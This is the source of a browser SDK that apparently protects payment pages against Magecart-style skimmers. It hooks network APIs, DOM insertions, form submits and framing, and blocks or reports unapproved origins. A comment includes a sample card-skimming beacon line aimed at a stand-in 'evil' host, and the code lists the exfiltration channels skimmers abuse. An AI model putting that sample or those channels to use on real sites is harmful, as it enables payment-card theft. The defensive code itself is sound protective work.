/*!
 * Nemesis Shield — Browser SDK (client-side runtime protection for checkout / payment pages).
 *
 * Learns your page's normal CLIENT-SIDE behavior, then in enforce mode:
 *
 *   BLOCKS (prevents the attack)
 *     - data exfiltration to un-approved origins across EVERY channel skimmers use:
 *       fetch, XMLHttpRequest, sendBeacon, image beacons (new Image().src), WebSocket, EventSource
 *     - Magecart / sideloaded scripts + iframes injected from un-approved origins
 *     - form-jacking: a form (esp. a payment form) re-pointed to submit to an attacker origin
 *
 *   DETECTS + ALERTS (reports a finding — PCI DSS 4.0.1 §11.6.1 tamper detection)
 *     - inline <script> injection / change (content fingerprint not in the approved inventory)
 *     - hidden input fields injected into a payment form (overlay skimmer)
 *     - clickjacking: the page rendered inside an un-approved frame ancestor
 *
 *   INVENTORY (PCI DSS 4.0.1 §6.4.3 — authorize + integrity + inventory of every script)
 *     - every external script origin and every inline-script fingerprint is reported to the console
 *
 * Even when an inline skimmer manages to run, its stolen data cannot leave: every exfil channel to an
 * un-approved origin is blocked. A learned, per-app allow-list — like a CSP the owner curates in the
 * console. Works with React, Angular, Vue, jQuery, and plain JS (shared browser primitives).
 * Fail-open (never breaks the page), privacy-preserving (origins + shapes only, never payloads),
 * first-party traffic always allowed.
 *
 *   <script src="nemesis-shield.js" data-token="nsk_your_app_token"></script>
 *   // or, in a bundled app:  NemesisShield.init({ token, frameBust: true });
 */
(function (root, factory) {
  var mod = factory();
  if (typeof module === "object" && module.exports) module.exports = mod;
  if (root) root.NemesisShield = mod;
  try {
    if (typeof document !== "undefined") {
      var cs = document.currentScript;
      var tok = cs && cs.getAttribute && cs.getAttribute("data-token");
      if (tok) mod.init({ token: tok });
    }
  } catch (e) {
    /* never break the host page */
  }
})(typeof globalThis !== "undefined" ? globalThis : this, function () {
  "use strict";

  var DEFAULT_ENDPOINT = "https://shield.nemesislabs.xyz/api/v1/sketches";

  function fnv1a(s) {
    var h = 0x811c9dc5 >>> 0;
    for (var i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i) & 0xff;
      h = Math.imul(h, 0x01000193) >>> 0;
    }
    return ("0000000" + h.toString(16)).slice(-8);
  }

  function originOf(url, base) {
    try {
      return new URL(url, base || undefined).origin.toLowerCase();
    } catch (e) {
      return null;
    }
  }

  // Client-side event -> a sketch that flows through the SAME server pipeline as backend requests.
  // "route" carries the channel: connect://<origin>, script://<origin>, inline://<fp>,
  // form://<origin>, payform://<origin>, field://<origin>, frame://<origin>.
  function shapeOf(kind, origin) {
    var K = kind.toUpperCase();
    var route = kind + "://" + origin;
    var canon = '{"route":"' + route + '","method":"' + K + '","params":[],"auth":0}';
    return { route: route, method: K, shape: fnv1a(canon) };
  }

  var PAY_RE = /card|cc[-_ ]?num|cardnumber|cvv|cvc|ccv|security ?code|expir|exp[-_ ]?date/i;
  function isPaymentField(el) {
    try {
      var ac = (el.getAttribute("autocomplete") || "").toLowerCase();
      if (ac.indexOf("cc-") === 0) return true;
      if (el.type === "password") return true;
      var n = (el.name || "") + " " + (el.id || "") + " " + (el.getAttribute("placeholder") || "");
      return PAY_RE.test(n);
    } catch (e) {
      return false;
    }
  }
  function isPaymentForm(form) {
    try {
      var ins = form.getElementsByTagName("input");
      for (var i = 0; i < ins.length; i++) if (isPaymentField(ins[i])) return true;
    } catch (e) {}
    return false;
  }

  function createShield(opts) {
    opts = opts || {};
    var env = opts.env || (typeof window !== "undefined" ? window : globalThis);
    var token = opts.token || env.NEMESIS_TOKEN || "";
    var endpoint = opts.endpoint || DEFAULT_ENDPOINT;
    var frameBust = !!opts.frameBust;
    var selfOrigin = (opts.selfOrigin || (env.location && env.location.origin) || "").toLowerCase();
    var fetchImpl = opts.fetch || (env.fetch ? env.fetch.bind(env) : null);

    var state = { mode: "observe", shapes: {}, knownBad: {}, haveBaseline: false };
    var buffer = [];

    function applyPolicy(d) {
      if (!d) return;
      if (d.mode) state.mode = d.mode;
      var pol = d.policy || {};
      if (pol.shapes) {
        state.shapes = pol.shapes;
        state.haveBaseline = Object.keys(pol.shapes).length > 0;
      }
      state.knownBad = {};
      (pol.knownBad || []).forEach(function (s) {
        state.knownBad[s] = 1;
      });
    }
    function decide(shape) {
      var per = state.shapes[shape];
      if (per === "allow") return null;
      if (per === "block") return "policy: blocked shape";
      if (state.knownBad[shape]) return "global threat intelligence";
      if (state.haveBaseline) return "off-baseline: unapproved behavior";
      return null;
    }
    function post(sketchesJson) {
      if (!token || !fetchImpl) return Promise.resolve();
      return fetchImpl(endpoint, {
        method: "POST",
        headers: { Authorization: "Bearer " + token, "Content-Type": "application/json" },
        body: '{"sketches":' + sketchesJson + "}",
        keepalive: true,
      })
        .then(function (r) {
          return r && r.ok ? r.json() : null;
        })
        .then(applyPolicy)
        .catch(function () {});
    }
    function record(kind, origin, status) {
      var s = shapeOf(kind, origin);
      buffer.push(
        '{"route":"' + s.route + '","method":"' + s.method + '","authenticated":false,"status":' +
          status + ',"params":[],"shape":"' + s.shape + '"}'
      );
      if (buffer.length >= 25) flush();
    }
    function flush() {
      if (!buffer.length) return;
      var b = buffer;
      buffer = [];
      post("[" + b.join(",") + "]");
    }
    function refresh() {
      post("[]");
    }

    // Core verdict. Records the event, returns true when it should be blocked. First-party always OK.
    function shouldBlock(kind, origin) {
      if (!origin || origin === selfOrigin) return false;
      if (state.mode !== "enforce") {
        record(kind, origin, 200);
        return false;
      }
      var reason = decide(shapeOf(kind, origin).shape);
      record(kind, origin, reason ? 403 : 200);
      return !!reason;
    }

    // ---- exfiltration channels (every gate a skimmer uses) ----
    function guardConnect(url) {
      return shouldBlock("connect", originOf(url, selfOrigin));
    }
    function installNetwork() {
      if (env.fetch) {
        var of = env.fetch.bind(env);
        env.fetch = function (input, init) {
          try {
            var u = typeof input === "string" ? input : input && input.url;
            if (guardConnect(u)) return Promise.reject(new Error("blocked_by_nemesis_shield"));
          } catch (e) {}
          return of(input, init);
        };
      }
      if (env.XMLHttpRequest && env.XMLHttpRequest.prototype) {
        var P = env.XMLHttpRequest.prototype, O = P.open, S = P.send;
        P.open = function (m, u) {
          try {
            this.__nsO = originOf(u, selfOrigin);
          } catch (e) {}
          return O.apply(this, arguments);
        };
        P.send = function () {
          try {
            if (shouldBlock("connect", this.__nsO)) {
              this.abort();
              return;
            }
          } catch (e) {}
          return S.apply(this, arguments);
        };
      }
      if (env.navigator && env.navigator.sendBeacon) {
        var SB = env.navigator.sendBeacon.bind(env.navigator);
        env.navigator.sendBeacon = function (u, data) {
          try {
            if (guardConnect(u)) return false;
          } catch (e) {}
          return SB(u, data);
        };
      }
      // Image-beacon exfil: new Image().src = "//evil/?cc=..." — the classic skimmer gate.
      if (env.HTMLImageElement && env.HTMLImageElement.prototype) {
        try {
          var d = Object.getOwnPropertyDescriptor(env.HTMLImageElement.prototype, "src");
          if (d && d.set) {
            Object.defineProperty(env.HTMLImageElement.prototype, "src", {
              configurable: true,
              enumerable: d.enumerable,
              get: d.get,
              set: function (v) {
                try {
                  if (guardConnect(v)) return;
                } catch (e) {}
                return d.set.call(this, v);
              },
            });
          }
        } catch (e) {}
      }
      // WebSocket / EventSource / Worker / SharedWorker exfil + code-load channels.
      ["WebSocket", "EventSource", "Worker", "SharedWorker"].forEach(function (name) {
        var Orig = env[name];
        if (typeof Orig !== "function") return;
        try {
          var Wrapped = function (url) {
            if (guardConnect(url)) throw new Error("blocked_by_nemesis_shield");
            return new Orig(url, arguments[1]);
          };
          Wrapped.prototype = Orig.prototype;
          Object.keys(Orig).forEach(function (k) {
            try {
              Wrapped[k] = Orig[k];
            } catch (e) {}
          });
          env[name] = Wrapped;
        } catch (e) {}
      });
      // Service worker registration from an un-approved origin (persistent MITM of every request).
      if (env.navigator && env.navigator.serviceWorker && env.navigator.serviceWorker.register) {
        var reg = env.navigator.serviceWorker.register.bind(env.navigator.serviceWorker);
        env.navigator.serviceWorker.register = function (url) {
          try {
            if (guardConnect(url)) return Promise.reject(new Error("blocked_by_nemesis_shield"));
          } catch (e) {}
          return reg.apply(this, arguments);
        };
      }
    }

    // ---- script inventory + integrity (§6.4.3) and injection blocking / tamper alerting (§11.6.1) ----
    function inventoryScript(node) {
      try {
        if (node.tagName === "SCRIPT") {
          if (node.src) return shouldBlock("script", originOf(node.src, selfOrigin)); // external: blockable
          var txt = node.textContent || "";
          if (txt) shouldBlock("inline", "fp-" + fnv1a(txt)); // inline: fingerprint -> tamper alert
          return false;
        }
        if (node.tagName === "IFRAME" && node.src) return shouldBlock("script", originOf(node.src, selfOrigin));
      } catch (e) {}
      return false;
    }
    // Resource-bearing attributes across every tag a skimmer can exfil or code-load through — the
    // img-beacon written via setAttribute (bypasses the Image.src property hook), <link rel=prefetch/
    // preload>, <video>/<audio>/<source>/<track>/<embed> src, <object data>, and <a ping>. Off-baseline
    // third-party loads are neutralized in enforce mode (blanked, not removed, so layout survives).
    function firstUrl(v) {
      return (v || "").split(",")[0].trim().split(/\s+/)[0];
    }
    function guardResource(node) {
      try {
        if (!node || node.nodeType !== 1 || !node.getAttribute) return;
        var tag = node.tagName, checks = [];
        if (tag === "IMG" || tag === "SOURCE") {
          if (node.getAttribute("src")) checks.push(["connect", node.getAttribute("src"), "src"]);
          if (node.getAttribute("srcset")) checks.push(["connect", firstUrl(node.getAttribute("srcset")), "srcset"]);
        } else if (tag === "LINK") {
          var rel = (node.getAttribute("rel") || "").toLowerCase();
          if (/(prefetch|preload|preconnect|dns-prefetch|stylesheet)/.test(rel) && node.getAttribute("href"))
            checks.push(["script", node.getAttribute("href"), "href"]);
        } else if (tag === "VIDEO" || tag === "AUDIO" || tag === "TRACK" || tag === "EMBED") {
          if (node.getAttribute("src")) checks.push(["connect", node.getAttribute("src"), "src"]);
          if (node.getAttribute("poster")) checks.push(["connect", node.getAttribute("poster"), "poster"]);
        } else if (tag === "OBJECT" && node.getAttribute("data")) {
          checks.push(["script", node.getAttribute("data"), "data"]);
        } else if (tag === "A" && node.getAttribute("ping")) {
          checks.push(["connect", node.getAttribute("ping"), "ping"]);
        }
        for (var i = 0; i < checks.length; i++) {
          if (shouldBlock(checks[i][0], originOf(checks[i][1], selfOrigin))) {
            try { checks[i][2] === "ping" ? node.removeAttribute("ping") : node.setAttribute(checks[i][2], checks[i][2] === "srcset" ? "" : "about:blank"); } catch (e) {}
          }
        }
      } catch (e) {}
    }
    var RES_TAGS = "img,source,link,video,audio,track,embed,object,a";
    function inspectNode(n) {
      try {
        if (!n || n.nodeType !== 1) return;
        var tag = n.tagName;
        if (tag === "SCRIPT" || tag === "IFRAME") {
          if (inventoryScript(n) && n.parentNode) {
            if (tag === "SCRIPT") n.type = "javascript/blocked";
            n.parentNode.removeChild(n); // prevents an external off-baseline script from loading
          }
        } else if (tag === "INPUT") {
          maybeFieldInjection(n);
        } else {
          guardResource(n);
        }
        // scan nested (e.g. a wrapper div carrying a script, input, or resource beacon)
        if (n.getElementsByTagName) {
          var s = n.getElementsByTagName("script");
          for (var i = 0; i < s.length; i++) inventoryScript(s[i]);
        }
        if (n.querySelectorAll) {
          var res = n.querySelectorAll(RES_TAGS);
          for (var j = 0; j < res.length; j++) guardResource(res[j]);
        }
      } catch (e) {}
    }
    // A hidden/late input added into a payment form == overlay skimmer. Detect + alert (§11.6.1).
    function maybeFieldInjection(input) {
      try {
        var form = input.form || (input.closest && input.closest("form"));
        if (form && isPaymentForm(form)) {
          var o = originOf((form.getAttribute && form.getAttribute("action")) || selfOrigin, selfOrigin) || selfOrigin;
          shouldBlock("field", o);
        }
      } catch (e) {}
    }

    function installDom() {
      if (!env.document) return;
      try {
        var ss = env.document.getElementsByTagName("script");
        for (var i = 0; i < ss.length; i++) inventoryScript(ss[i]); // initial script inventory
        if (env.document.querySelectorAll) {
          var res = env.document.querySelectorAll(RES_TAGS); // initial resource inventory
          for (var k = 0; k < res.length; k++) guardResource(res[k]);
        }
      } catch (e) {}
      if (!env.MutationObserver) return;
      var mo = new env.MutationObserver(function (muts) {
        for (var i = 0; i < muts.length; i++) {
          if (muts[i].type === "attributes") {
            // src/href/srcset/etc. re-pointed on an existing node (setAttribute path)
            guardResource(muts[i].target);
            continue;
          }
          var added = muts[i].addedNodes || [];
          for (var j = 0; j < added.length; j++) inspectNode(added[j]);
        }
      });
      try {
        mo.observe(env.document.documentElement || env.document, {
          childList: true,
          subtree: true,
          attributes: true,
          attributeFilter: ["src", "srcset", "href", "poster", "data", "ping"],
        });
      } catch (e) {}
    }

    // ---- form-jacking: block a form (esp. payment) re-pointed to an attacker origin ----
    function installForms() {
      if (!env.document || !env.document.addEventListener) return;
      env.document.addEventListener(
        "submit",
        function (e) {
          try {
            var f = e.target;
            if (!f || !f.action) return;
            var o = originOf(f.action, selfOrigin);
            var kind = isPaymentForm(f) ? "payform" : "form";
            if (shouldBlock(kind, o)) e.preventDefault();
          } catch (err) {}
        },
        true
      );
    }

    // ---- clickjacking: page rendered inside an un-approved frame ancestor ----
    function installFraming() {
      try {
        if (env.top && env.self && env.top !== env.self) {
          var anc = "";
          try {
            anc = (env.document && env.document.referrer && originOf(env.document.referrer)) || "unknown";
          } catch (e) {
            anc = "unknown";
          }
          if (shouldBlock("frame", anc) && frameBust) {
            try {
              env.top.location = env.self.location.href;
            } catch (e) {}
          }
        }
      } catch (e) {}
    }

    function install() {
      if (!token) return api;
      installNetwork();
      installDom();
      installForms();
      installFraming();
      refresh();
      if (env.setInterval)
        env.setInterval(function () {
          flush();
          refresh();
        }, 5000);
      return api;
    }

    var api = {
      install: install,
      refresh: refresh,
      flush: flush,
      decide: decide,
      shapeOf: shapeOf,
      shouldBlock: shouldBlock,
      guardResource: guardResource,
      isPaymentField: isPaymentField,
      isPaymentForm: isPaymentForm,
      _applyPolicy: applyPolicy,
      _state: state,
    };
    return api;
  }

  return {
    createShield: createShield,
    init: function (opts) {
      return createShield(opts).install();
    },
    shapeOf: shapeOf,
    fnv1a: fnv1a,
  };
});
